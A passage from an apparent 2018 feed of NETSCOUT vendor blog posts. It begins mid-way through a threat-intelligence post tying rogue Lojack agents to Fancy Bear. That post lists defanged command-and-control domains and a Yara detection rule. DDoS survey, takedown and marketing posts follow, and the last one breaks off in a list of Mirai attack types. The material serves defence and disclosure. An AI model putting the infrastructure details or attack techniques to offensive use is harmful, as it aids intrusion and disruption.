<p>ASERT assesses with moderate confidence that the rogue Lojack agents are attributed to Fancy Bear based on shared infrastructure with previous operations. The following domains, extracted from the rogue Lojack agents trace back to Fancy Bear operations:</p>

<ol>
	<li>elaxo[.]org</li>
	<li>ikmtrust[.]com</li>
	<li>lxwo[.]org</li>
	<li>sysanalyticweb[.]com (<strong>Figure 3</strong> &amp; <strong>Figure 4</strong>)</li>
</ol>

<p>Researchers from <a href="https://www.jigsawsecurityenterprise.com/single-post/2017/11/01/Malicious-Documents-Targeting-Security-Professionals">Jigsaw Security</a>, based on leads from <a href="https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html">Talos</a> in late 2017, traced the domains elaxo[.]org and ikmtrust[.]com and the tool Sedupload, to a Fancy Bear operation.&nbsp; The domain lxwo[.]org appeared in a blog post from <a href="https://threatreconblog.com/2017/02/03/apt28-malicious-document/">Threat Intel Recon</a> that resolved to an IP address within a document attributed to Fancy Bear.&nbsp; The rogue Lojack samples containing the sysanalyticweb[.]com domains were only recently spotted in the wild (April 2018). Despite the hijack of this software being a publicly known tactic, there are many similarities in the binary comparisons (above) and infrastructure analysis (below) that increase the probability it is the same actor(s):</p>

<ul>
	<li>All the listed domains are associated with the same Lojack agent utilizing the same compile time.</li>
	<li>The domains in question all contain nonsensical Registrant information where the actor tends to copy/paste the same information in multiple fields.</li>
	<li>Each domain includes a Registrant Name (often a nonsensical word), but additionally includes a similar word in the Registrant Organization field.
	<ul>
		<li>This is interesting because that is a field that is often skipped when a Registrant Name is present, but this actor(s) regularly utilizes both fields</li>
	</ul>
	</li>
</ul>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/sysanlyticweb_deob.png" /> Figure 3. XORed C2 Server - NETSCOUT</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/sysanalyticweb.png" /> Figure 4. Live (April 2018) C2 - NETSCOUT</p>

<h2>Conclusion &amp; Recommendations</h2>

<p>Hijacking legitimate software is a common enough tactic for malicious actors. A key factor making this activity so devious is the malicious Lojack samples were simply labeled "unsafe”, "suspicious", or "DangerousObject", rather than malware. As a result, rogue Lojack samples could fly under the radar and give attackers a stealthy backdoor into victim systems. ASERT recommends scanning for rogue Lojack agents using the Yara signature listed in the Appendix (below) and blocking the domains contained within this blog. &nbsp;</p>

<h2><a id="Yara"></a>Appendix: Yara Signature</h2>

<pre>
rule ComputraceAgent
{
&nbsp;meta:
&nbsp;&nbsp;&nbsp;&nbsp; description = "Absolute Computrace Agent Executable"
&nbsp;&nbsp;&nbsp;&nbsp; thread_level = 3
&nbsp;&nbsp;&nbsp;&nbsp; in_the_wild = true
&nbsp;strings:
&nbsp;&nbsp;&nbsp;&nbsp; $a = {D1 E0 F5 8B 4D 0C 83 D1 00 8B EC FF 33 83 C3 04}
&nbsp;&nbsp;&nbsp;&nbsp; $mz = {4d 5a}
&nbsp;&nbsp;&nbsp;&nbsp; $b1 = {72 70 63 6E 65 74 70 2E 65 78 65 00 72 70 63 6E 65 74 70 00}
&nbsp;&nbsp;&nbsp;&nbsp; $b2 = {54 61 67 49 64 00}
&nbsp;condition:
&nbsp;&nbsp;&nbsp;&nbsp; ($mz at 0 ) and ($a or ($b1 and $b2))
}</pre>

<p><small><em>Code Snippet 1: Yara signature to detect computrace/Lojack agent (Retrieved from <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Computrace-Backdoor-Revisited.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Comp…</a>)</em></small></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Lojack%20Becomes%20a%20Double-Agent.jpg" length="213226" type="image/jpeg"/>
    <guid isPermaLink="false">870f4da5-5e5f-478a-a58c-1138c6beaa41</guid>
    <pubDate>Tue, 01 May 2018 09:44:30 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Customer Success Story: DQE Communications</title>
  <link>http://localhost:7996/blog/customer-success-story-dqe-communications</link>
  <description>Customizing Network Solutions for Business Growth DQE Communications is one of the leading providers of commercial fiber optic networking to businesses in southwestern Pennsylvania. Offering a level of network service and support that’s unequaled by any other area provider, DQE provides businesses, governmental agencies and carriers the fastest data speeds possible, the highest...</description>
  <content:encoded><![CDATA[<p><strong>Customizing Network Solutions for Business Growth </strong> </p>

<p>DQE Communications is one of the leading providers of commercial fiber optic networking to businesses in southwestern Pennsylvania. Offering a level of network service and support that’s unequaled by any other area provider, DQE provides businesses, governmental agencies and carriers the fastest data speeds possible, the highest level of service reliability, and the most dependable support. DQE’s network of fiber-optic cables currently spans 3,247+ miles throughout western Pennsylvania, and on into northern West Virginia. Founded in 1997, DQE is continually working to expand its network.</p>

<p><strong>Coping with a Lack of Visibility into Network Traffic </strong></p>

<p>Insufficient visibility into their network challenged DQE’s operational readiness and its plans for continued expansion. As the company grew, Patrick Lazorchak, Director, IP Services and Network Engineering quickly realized that DQE did not have the tools necessary to protect its growing network and customers against the increasing risk of Distributed Denial of Service (DDoS) attacks. DQE turned to Arbor Sightline and Threat Mitigation System. “We did our research and Arbor’s reputation and footprint in the market was the key motivator for us to take a closer look,” said Lazorchak. “Once we met with the sales and engineering teams, our choice was easy.”</p>

<p><img alt="DQE Deployment Diagram" data-entity-type="file" data-entity-uuid="daa6f084-6adf-4d78-a60d-6e7a36ce26a9" src="http://localhost:7996/sites/default/files/inline-images/DQE%20deployment%20diagram.png" /></p>

<p><strong>Scalable <a href="https://www.netscout.com/ddos-protection">DDoS</a> Attack Detection and Mitigation </strong></p>

<p>Arbor Sightline provides comprehensive network visibility and reporting capabilities to help Service Providers detect and understand availability threats, and improve traffic engineering, peering relationships and service performance. Arbor Sightline can also serve as a platform for managed DDoS protection services – which DQE plans to offer its customers. Arbor Sightline scales on physical and virtual instances to provide comprehensive DDoS detection across an entire service provider network, from the customer edge to the peering edge to the data center edge (or cloud edge) to the mobile edge, including the backbone network in-between. With this unparalleled visibility, Arbor Sightline’s workflows enable quick effective mitigation of any DDoS attack via Arbor Threat Mitigation System. Arbor Threat Mitigation System provides a full suite of countermeasures that surgically removes up to 400Gbps of DDoS attack traffic while enabling the flow of legitimate traffic — all without interrupting network services. Proven effective for detecting and removing threats such as high-volume flood attacks, stealthy application-layer attacks and attacks hidden in SSL packets, Arbor Threat Mitigation System safeguards IPv4 and IPv6 infrastructure from distributed denial of service attacks. Automated and proven, Threat Mitigation System works to keep networks and services up 24 hours a day, seven days a week, 365 days a year.</p>

<p><img alt="Sightine TMS deployment DQE" data-entity-type="file" data-entity-uuid="e5f9ec81-fbb1-4d03-8722-700673c8d74f" src="http://localhost:7996/sites/default/files/inline-images/Sightine%20TMS%20deployment%20DQE.png" /></p>

<p><strong>The Results </strong></p>

<p>DQE had Arbor Sightline and Threat Mitigation System up and running quickly, resulting in an immediate return on investment. Six months after the Arbor Sightline deployment, DQE installed a pair of Threat Mitigation System solutions at its upstream peering points. According to Lazorchak, “We started with the Arbor Sightline deployment and benefited from increased network visibility day-one.” With Arbor Sightline and Threat Mitigation System in DQE’s environment, network operation centers can now respond to events with planned effectiveness. Targeted attacks are now effectively mitigated, relieving DQE of expensive engineering resources and reducing time to mitigate. DQE’s security team has gone from reactive to proactive. Backed by Arbor’s solutions, DQE now has the ability to protect its infrastructure and its customers.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/DQE%20main%20image.jpg" length="851103" type="image/jpeg"/>
    <guid isPermaLink="false">8d423bac-4caf-4d0e-9e27-0ad5d8f83d84</guid>
    <pubDate>Mon, 30 Apr 2018 13:45:56 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Growing Reliance on Multi-cloud Boosts Need for Smart Data</title>
  <link>http://localhost:7996/blog/growing-reliance-multi-cloud-boosts-need-smart-data</link>
  <description>As the cloud computing market has soared, businesses have begun incorporating a mix of cloud services to meet their Digital Transformation (DX) objectives. Multi-cloud and hybrid cloud environments are fast becoming the option of choice. In fact, according to a recent Information Age article, 451 Research determined that the future of IT is multi-cloud and hybrid with 69...</description>
  <content:encoded><![CDATA[<p>As the cloud computing market has soared, businesses have begun incorporating a mix of cloud services to meet their Digital Transformation (DX) objectives. Multi-cloud and hybrid cloud environments are fast becoming the option of choice. In fact, according to a recent <a href="http://www.information-age.com/multi-cloudhybrid-environment-dominate-enterprise-123469737/"target="_blank">Information Age</a> article, 451 Research determined that the future of IT is multi-cloud and hybrid with 69 percent of survey respondents planning to incorporate some form of multi-cloud environment by 2019.</p>
<p>While the adoption of multi-cloud environments does enable businesses to mitigate risks and take advantage of the strengths of different providers, it also creates an increasingly complex environment for IT to manage. As more and more data traverses hybrid cloud environments and SD-WAN (software-defined wide-area networks), the need for continuous and scalable monitoring and analysis of traffic flows will become increasingly crucial. Reliance on cloud technologies is making it imperative that IT has end-to-end visibility across data centers, branch offices, cloud environments, and SaaS environments in order to identify existing, as well as potential problems, so they can be resolved quickly.</p>
<p>Being able to see and analyze traffic flows is key to achieving service assurance, security assurance and business analytics. The insights obtained from passive monitoring and real-time analysis of traffic flows can be vital in efforts to drive down CAPEX and OPEX as businesses embrace DX. &nbsp;</p>
<p>As businesses increasingly incorporate connected devices, such as Internet of Things (IoT), maintaining always-on availability is a competitive necessity. With these connected devices comes a tremendous volume of data traversing both physical and virtual networks. In order to extract real-time insights into service and security assurance, effective analysis and efficient extraction of smart metadata has to be done continuously and at the source. &nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>To achieve this, IT needs to adopt a <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-04.26.18">Smart Data approach</a>. Such an approach will enable a complete understanding of application performance, service availability, reliability and responsiveness for a top-down, detailed view of the hybrid IT environment. This will allow IT to troubleshoot in real-time, as well as back-in-time. Having a &ldquo;back-in-time&rdquo; capability allows IT to learn from past mistakes and modify service delivery to mitigate future issues and risks.</p>
<p>With the growing trend toward multi-cloud and hybrid cloud environments, IT should look to smart data to assure the performance of applications and services, as they digitally transform their businesses today and into the future.</p>
<p>This blog is based on the article, <a href="https://www.itproportal.com/features/the-smart-way-to-unleash-the-power-of-the-cloud/"target="_blank"><em>The smart way to unleash the power of the cloud, </em></a>written by Michael Segal, Area VP Strategy at NETSCOUT, which was published on ITProPortal.</p>]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/cloud.jpg" length="208774" type="image/jpeg"/>
    <guid isPermaLink="false">adc88c19-9dee-4057-9c49-d481be324484</guid>
    <pubDate>Thu, 26 Apr 2018 17:47:56 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>Largest DDoS Attack Service Shut Down</title>
  <link>http://localhost:7996/blog/largest-ddos-attack-service-shut-down</link>
  <description>DDoS-for-Hire services, like Webstresser, run rampant in the underground marketplace and their services are often negligible in price. Many of the services list disclaimers in an attempt to mislead the illegal nature of the service.</description>
  <content:encoded><![CDATA[<p><strong>Executive Summary</strong></p>

<p>April 25, 2018 marked the day attackers lost access to what has been dubbed one of the largest DDoS as a Service (DaaS) providers in existence. Responsible for millions of <a href="https://www.netscout.com/what-is-ddos">DDoS attacks</a> around the globe, webstresser.org now shows a “THIS SITE HAS BEEN SEIZED” message from the U.S. DoD, Defense Criminal Investigative Service, Cyber Field Office (<strong>Figure 1</strong>). The message comes in conjunction with a press release citing the arrest of multiple individuals associated with the service.</p>

<figure class="caption caption-img align-center" role="group"><img alt="Largest DDoS Attack Service Shut Down" data-entity-type="file" data-entity-uuid="b6b1dba1-635e-4a8f-9dd4-ba48ee311221" src="http://localhost:7996/sites/default/files/inline-images/Largest%20DDoS%20Shut%20Down%20image%201.jpg" /><figcaption>Figure 1: Seizure message from U.S. DoD</figcaption></figure><p> </p>

<p>A report from BBC News (<a href="http://www.bbc.com/news/uk-43893420" target="_blank">Cyber-attack website Webstresser taken down</a>), stated:</p>

<p><strong>A website blamed for launching more than four million cyber-attacks around the world, including attempts to crash banks in the UK, has been taken down in a major international investigation.</strong></p>

<p>The operation, which involved the UK's National Crime Agency, blocked <a href="http://Webstresser.org" target="_blank">Webstresser.org</a> - which allows criminals to buy DDoS and cyber-attacks on businesses. The site was used by a British suspect to attack high street banks last year, causing hundreds of thousands of pounds of damage. Six suspected members of the gang behind the site have been arrested, with computers seized in the UK, Holland and elsewhere.</p>

<h3>Key Points</h3>

<ul><li>DDoS-for-Hire providers offer seemingly legitimate services that are often used for nefarious purposes.</li>
	<li>The services provided by DDoS-for-Hire platforms are often inexpensive and allow any would-be attacker to launch DDoS attack at a target of their choosing.</li>
	<li>Attacks range from high volume floods to sophisticated multi-vector attacks targeting applications, infrastructure and bandwidth simultaneously.</li>
	<li>Disruptions and takedowns of DDoS-for-Hire services assist <a href="http://localhost:7996/product/netscout-aed" target="_blank" title="Arbor Edge Defense">network defenders</a> around the world by limiting the number of attacks and tools they need to defend against.</li>
</ul><h3>DDoS Attack Service Summary</h3>

<p>DDoS-for-Hire services, like Webstresser, run rampant in the underground marketplace and their services are often negligible in price. Many of the services list disclaimers in an attempt to mislead the illegal nature of the service. DDoS-for-Hire services offer minuscule pricing, which allows anyone with a small amount of digital currency or other online payment processing service to launch DDoS at a target of their choosing. These attacks often translate to rage fueled, irrational responses of gamers on other gamers. In other cases, the DaaS platforms may be used in hacktivist operations to send a message or take down a web site in opposition to someone’s viewpoint. The ease of accessibility to DDoS attack services enables virtually anyone with the means and power to launch a cyber-attack with relative safety and anonymity.</p>

<p>Many such services use a combination of shared servers, also known as bulletproof hosting, and <a href="https://www.netscout.com/blog/business-botnets">botnets</a>. It should be noted that many of the services have strayed from traditional botnet infrastructure to shared hosting. Additionally, <a href="https://www.netscout.com/what-is-ddos#reflectionAmplificationAttacks">amplification attacks</a> have become commonplace in these services and attackers are able to easily disrupt services, operations, and websites.</p>

<h3>Conclusion: Fighting DDoS Attack Services</h3>

<p>Takedowns that disrupt large DDoS-for-Hire services greatly assist in mitigating potential cyber-attacks. Further, the arrest of actors behind these services helps to prevent similar services from resuming, and the example set by law enforcement may discourage others from implementing similar services. Although such operations will discourage many from starting their own DDoS-for-Hire service, takedowns such as this often create a vacuum that is quickly filled by others looking fill that vacuum. Actors that offer these services will continue to exist and no doubt new offerings will emerge, but the continued effort of law enforcement helps drive a balance to the nefarious activity.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Largest%20DDoS%20Main%20image.jpg" length="575605" type="image/jpeg"/>
    <guid isPermaLink="false">0aae8512-1b10-48f2-a592-a876b6b6c922</guid>
    <pubDate>Thu, 26 Apr 2018 17:15:09 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Data Breaches and Infrastructure Under Attack</title>
  <link>http://localhost:7996/blog/infrastructure-under-attack</link>
  <description>Because DDoS attacks and data breaches are so different in nature, conventional security infrastructure components used to combat breaches – perimeter firewalls, intrusion detection/preventions systems (IDI/IPS) and the like – are comparatively ineffective at mitigating DDoS attacks.</description>
  <content:encoded><![CDATA[<h3>What makes a DDoS attack different from an everyday data breach?</h3>

<p>The answer is embedded in the term: denial of service. The motive of a DDoS attack is to prevent the delivery of online services that people depend on. Financial institutions, gaming and e-commerce websites are among the top targets of DDoS attacks, as are cloud service providers that host sites or service applications for business customers. Even a brief disruption of service delivery can cost an enterprise millions in lost business, not counting the after-effects of alienated customers and reputational damage.</p>

<p>Because DDoS attacks and data breaches are so different in nature, conventional security infrastructure components used to combat breaches – <a href="https://www.netscout.com/product/netscout-aed">perimeter firewalls</a>, intrusion detection/preventions systems (IDI/IPS) and the like – are comparatively ineffective at mitigating DDoS attacks. These security products certainly have their place in a layered defense strategy, serving to protect data confidentiality and integrity. However, they fail to address the fundamental issue in DDoS attacks, namely network availability.&nbsp;</p>

<p>In fact, these components themselves are increasingly the target of DDoS attacks aimed at incapacitating them. The 13<sup>th</sup> annual Worldwide Infrastructure Security Report (WISR), NETSCOUT Arbor’s annual survey of security professionals in both the service provider and enterprise segments, uncovered a significant increase in DDoS attacks targeting infrastructure over the previous year. Among enterprise respondents, 61% had experienced attacks on network infrastructure, and 52% had firewalls or IPS devices fail or contribute to an outage during a DDoS attack. Attacks on infrastructure are less prevalent among service providers, whose customers are still the primary target of DDoS attacks. Nonetheless, 10% of attacks on service providers targeted network infrastructure and another 15% targeted service infrastructure.</p>

<p>Meanwhile, data center operators reported that 36% of inbound attacks targeted routers, firewalls, load balancers and other data center infrastructure. Some 48% of data center respondents experienced firewall, IDS/IPS device and load-balancer failure contributing to an outage during a DDoS attack, an increase from 43% in 2016.</p>

<p>Infrastructure components are particularly vulnerable to <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="61804770-c5fa-44d0-8285-f3f702267a8f" href="http://localhost:7996/node/76526">TCP State Exhaustion attacks</a>, which attempt to consume the connection state tables (session records) used by load balancers, firewalls, IPS, and application servers to identify legitimate packet traffic. Such attacks can take down even high-capacity devices capable of maintaining state on millions of connections. In the latest WISR, TCP State Exhaustion attacks accounted for nearly 12% of all attacks reported.</p>

<p>In spite of their vulnerability, firewalls, IPS, and load-balancers remain at the top of the list of security measures organizations say they employ to mitigate DDoS attacks. Among service providers, firewalls were the second most reported DDoS mitigation option, while on the enterprise side, firewalls were the first choice of 82% of respondents. It is somewhat discouraging that some of the most popular DDoS mitigation measures are also the least effective, given the ease with which a state-based attack can overwhelm them.</p>

<p>On a positive note, however, the increased frequency of DDoS attacks reported in our 2016 survey appears to have driven wider adoption of Intelligent DDoS Mitigation Systems (IDMS) in 2017. About half of respondents indicated that an IDMS was now a part of perimeter protection, a sharp increase from the previous year’s 29%.</p>

<p>Any organization that delivers services over the web needs strong, purpose-built <a href="https://www.netscout.com/ddos-protection">DDoS protection</a>. Security experts continue to recommend as best practice a hybrid solution combining on-premise defenses and cloud-based mitigation capabilities. Specifically, with regard to attacks on network infrastructure, a dedicated DDoS on-premise appliance should be deployed in front of infrastructure components to protect them from attacks and enable them to do their job unimpeded.&nbsp;</p>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": {
    "@type": "Question",
    "name": "What makes a DDoS attack different from an everyday data breach?",
    "acceptedAnswer": {
      "@type": "Answer",
      "text": "The answer is embedded in the term: denial of service. The motive of a DDoS attack is to prevent the delivery of online services that people depend on. Financial institutions, gaming and e-commerce websites are among the top targets of DDoS attacks, as are cloud service providers that host sites or service applications for business customers. Even a brief disruption of service delivery can cost an enterprise millions in lost business, not counting the after-effects of alienated customers and reputational damage."
    }
  }
}
</script>]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/ddos">DDoS</category>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Infrastructure%204.25.18.jpg" length="284020" type="image/jpeg"/>
    <guid isPermaLink="false">5f0f060f-4949-404d-9957-ab320e816b2c</guid>
    <pubDate>Wed, 25 Apr 2018 13:48:32 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Attacks on Encrypted Services</title>
  <link>http://localhost:7996/blog/attacks-encrypted-services</link>
  <description>Encryption is one of the most basic necessities in the security arsenal. It’s what makes it possible for banks to offer online banking and funds transfers, or for consumers to make purchases online using their credit or debit cards. It’s what protects the public’s online interaction with government agencies or health care providers. It should surprise no one, however, that...</description>
  <content:encoded><![CDATA[<p>Encryption is one of the most basic necessities in the security arsenal. It’s what makes it possible for banks to offer online banking and funds transfers, or for consumers to make purchases online using their credit or debit cards. It’s what protects the public’s online interaction with government agencies or health care providers. It should surprise no one, however, that encrypted services are prime targets of DDoS attacks. Such services enable access to a wealth of personal, confidential, and financial data. Identity thieves and cyber criminals can have a field day if they succeed in breaking web service encryption.</p>

<p>According to NETSCOUT Arbor’s 13<sup>th</sup> Annual Worldwide Infrastructure Security Report (WISR), attacks targeting encrypted web services have become increasingly common in recent years. Among enterprise, government, and education (EGE) respondents, 53% of detected attacks targeted encrypted services at the application layer. And 42% of respondents experienced attacks targeting the TLS/SSL (Transport Layer Security/Secure Socket Layer) protocol governing client-server authentication and secure communications. Among service providers, the percentage seeing attacks targeting secure web services (HTTPS) rose significantly over the previous year, from 52% to 61%.&nbsp;</p>

<p><strong>The Four Key Encryption Attack Types</strong></p>

<p>DDoS attacks targeting encrypted services tend to fall into four categories:</p>

<ul>
	<li>Attacks that target the SSL/TLS negotiation, commonly known as the “handshake,” which determines how two parties to an internet connection will encrypt their communications.</li>
	<li>Protocol or connection attacks against SSL service ports, which seek to exploit SSL vulnerabilities.</li>
	<li>Volumetric attacks targeting SSL/TLS service ports, which overwhelm port capacity with high volume traffic floods.</li>
	<li>Application-layer attacks against underlying service running over SSL/TLS.</li>
</ul>

<p>Attackers are unrelenting in their assaults on high-value encrypted targets. Given the critical nature of most encrypted applications and services, a single successful attack can have devastating consequences. The breadth, variety, and escalation of attacks on secure web services heightens the need for a multi-layered defensive posture, with capabilities to detect and mitigate the full range of today’s attack types.</p>

<p><strong>Fighting Fire with Fire: Foiling Encrypted Attacks</strong></p>

<p>To make matters even more challenging for security teams, attackers often use SSL/TLS encryption themselves to hide their nefarious activity. A high volume of internet traffic moves among networks without being detected or inspected, making it easy for malicious actors to hide amid legitimate traffic, preparing to unleash attacks on secure HTTPS services. A key component of the security arsenal, therefore, is the ability to inspect encrypted traffic securely and attest to its authenticity without slowing, disrupting or compromising legitimate traffic. While decryption is not always necessary for successful mitigation, there is clearly a growing need for scalable solutions for decrypting packets.</p>

<p>One positive conclusion coming out of the 13<sup>th</sup> WISR is that both service providers and enterprises are recognizing that traditional firewalls and intrusion prevention systems are insufficient in confronting sophisticated DDoS attacks – particularly encrypted attacks targeting encrypted services. Encryption is essential, but cannot be relied upon on its own to thwart determined and sophisticated attackers. Operators and hosts of secure web services increasingly recognize the need for <a href="https://www.netscout.com/ddos-protection">purpose-built Intelligent DDoS Mitigation Systems</a> (IDMS) as the only effective option for mitigating DDoS attacks. Best practices call for a layered approach combining always-on, on-premise defenses with cloud-based mitigation capabilities that activate automatically based on the size and nature of the threat.</p>

<p>Reputational and brand damage are frequently cited as the worst consequences of a DDoS attack. Nothing could be more damaging to an organization’s reputation than to compromise the secure services that consumers have come to trust and rely upon every day with hardly a second thought. Institutions need to take measures that go beyond encryption to ensure the integrity and availability of their most critical services.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Encryption%204.23.18.jpg" length="804524" type="image/jpeg"/>
    <guid isPermaLink="false">33522121-e2ae-49c2-abac-a10c3588cf5f</guid>
    <pubDate>Mon, 23 Apr 2018 13:13:16 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Delivering the Edge Computing Promise</title>
  <link>http://localhost:7996/blog/delivering-edge-computing-promise</link>
  <description>Edge computing, driven by the rapid proliferation of the Internet of Things (IoT) and 5G technology, is poised to change the world as we know it. According to the IDC FutureScape: Worldwide IoT 2018 Predictions, by 2020, IT spend on Edge infrastructure will near 18 percent of the total spend on IoT infrastructure, largely as a result of converged IT/OT systems that lower the...</description>
  <content:encoded><![CDATA[<p>Edge computing, driven by the rapid proliferation of the Internet of Things (IoT) and 5G technology, is poised to change the world as we know it.&nbsp; According to the <em>IDC FutureScape: Worldwide IoT 2018 Predictions, </em>by 2020, IT spend on Edge infrastructure will near 18 percent of the total spend on IoT infrastructure, largely as a result of converged IT/OT systems that lower the time-to-value of data collected from connected devices.</p>

<p>Frankly, IoT is everywhere - from smart buildings, automated traffic management, fitness trackers, and connected fridges, just to name a few of its increasingly ubiquitous applications. &nbsp;The growth of IoT has spurred a push toward edge computing, which allows large volumes of data that are generated by these connected devices to be processed more quickly at the edge of the network, rather than at a remote data center. &nbsp;Foundational to the success of IoT is the cloud, whose speed, agility and scalability reduce the latency of edge computing.</p>

<p>Edge computing is also poised to play a key role in enabling the full potential of 5G. Both 5G and IoT will place greater and greater demands on the network’s ability to support increased data loads and unpredictable traffic patterns. Reduced latency and increased compute efficiency will be required, which has put pressure on service providers to move network infrastructure to the edge. In this brave new world, operators need assurance that their connectivity will remain ubiquitous, consistent and most importantly - reliable. Achieving this will necessitate complete visibility across the entire IoT lifecycle.</p>

<p>While the tremendous amounts of data generated by virtual solutions will provide operators with deep intelligence that in turn will enable them to gain meaningful insights and inform their network policy and traffic management systems, the unstructured nature of this data will require it to be normalized and correlated in the context of service delivery, operations and business performance in order to be of any real value. &nbsp;To maintain visibility throughout every aspect of the IoT lifecycle, operators will need to utilize a smart data solution.</p>

<p>A growing reliance on edge computing makes access to real-time, scalable metadata that is imbued with user experience derived from network traffic an indispensable resource. Leveraging smart data, operators will be able to gain valuable insights into how IoT devices and machines on their network behave, how they interact with the network and the type of traffic patterns they produce. These insights will allow for better-informed decisions about where to allocate capacity, how to boost performance and how to identify anomalies within the network.</p>

<p><a href="https://www.netscout.com/solutions/iot-monitoring/carrier-services/?ls=PR-MKTG&amp;lsd=blog-041718-1">Smart data solutions</a> are the absolute key to allowing operators to monitor the entirety of the IoT environment, and be certain performance is assured, and every device is connected.</p>

<p>This blog is based on the article, <a href="http://www.radio-electronics.com/articles/cellular-telecoms/smart-data-giving-operators-the-225" target="_blank"><em>Smart data – giving operators the edge</em></a> written by John English, Senior Product Manager, Service Providers for NETSCOUT, which was published on Radio-Electronics.com.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/smart%20data%20edge%20computing.jpg" length="208572" type="image/jpeg"/>
    <guid isPermaLink="false">b16bd91b-310b-4151-a709-e1d10a7235b4</guid>
    <pubDate>Wed, 18 Apr 2018 18:34:46 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Intelligently Automated DDoS Defense</title>
  <link>http://localhost:7996/blog/intelligently-automated-ddos-defense</link>
  <description>Many business organizations struggle to detect and mitigate Distributed Denial of Service (DDoS) attacks in a timely and efficient manner. The cost of downtime, which for most organizations can run more than $500 per minute, is not the only risk. DDoS is increasingly being used as part of broader attack campaigns which include ransomware and downloading malware targeting the...</description>
  <content:encoded><![CDATA[<p>Many business organizations struggle to detect and mitigate Distributed Denial of Service (DDoS) attacks in a timely and efficient manner. The cost of downtime, which for most organizations can run more than $500 per minute, is not the only risk. DDoS is increasingly being used as part of broader attack campaigns which include ransomware and downloading malware targeting the theft of valuable information assets.</p>

<p>Neustar commissioned <a href="https://hello.neustar.biz/201705-Security-Solutions-DDoS-SOC-Report-LP.html" target="_blank">an independent global study</a> of over 1,000 directors, managers, CISOs, CSOs, and CTOs, over half (51%) found their organizations took more than three hours to detect and identify a DDoS attack. These numbers show a marked deterioration from 2016. Almost half (48%) took over three hours to respond to a DDoS attack once detected, an 8% increase over 2016.</p>
<img alt="Intelligently Automated DDoS Defense Growth Chart" data-entity-type="file" data-entity-uuid="6f465d58-e6bb-47f6-9f01-8b408e7f0a36" src="http://localhost:7996/sites/default/files/inline-images/Intelligently%20automated%20image%201.JPG" class="align-center" /><p><strong>DDoS Attacks Are Growing in Size and Sophistication </strong></p>

<p><a href="https://www.netscout.com/ddos-protection">DDoS attacks</a> have changed significantly in size, frequency and, most importantly, sophistication. They’ve also changed in terms of duration. For example, according to Arbor’s 13th annual Worldwide Infrastructure Security Report, the average duration of a DDoS attack in 2017 was around 46 minutes, down from 55 minutes last year. However, do not equate length with risk because the impact could last much longer. For example, say a front-end website is brought down by a DDoS attack. The multiple back-end systems which rely upon it to communicate can take much longer than 30 minutes to synchronize and come back up. Also, unlike malware which lies dormant inside an organization for months at a time; a DDoS attack hits without warning and the impact is immediate.</p>

<p>An example of increasing sophistication can be found in the emergence of multifaceted botnets leveraging the Internet of Things (IoT). Millions of unsecure devices connected to the internet have created a perfect ‘breeding ground’ for large and dynamic botnets that challenge traditional protection strategies. The Mirai botnet alone is estimated to have compromised more than half a million IoT devices worldwide.</p>

<p>The botnet is capable of launching not only large volume but also much more complex, multi-vector attacks, including:</p>

<ul><li>SYN-flooding</li>
	<li>UDP flooding</li>
	<li>Valve Steam Engine (VSE) query-flooding</li>
	<li>GRE-flooding</li>
	<li>CK-flooding (including a variant intended to defeat intelligent DDoS mitigation systems, or IDMSes)</li>
	<li>Pseudo-random DNS label-prepending attacks (also known as DNS ‘Water Torture’ attacks)</li>
	<li>HTTP GET attacks</li>
	<li>HTTP POST attacks</li>
	<li>HTTP HEAD attacks</li>
</ul><p>These attack techniques go well beyond straight-forward volumetric attacks. Mirai and its derivatives can simultaneously target:</p>

<ul><li>GRE-tunneling (used in some DDoS mitigation architectures for scrubbing traffic)</li>
	<li>Potentially vulnerable third-party vectors (like DNS services)</li>
	<li>Applications directly via Layer7 (HTTP GET/POST)</li>
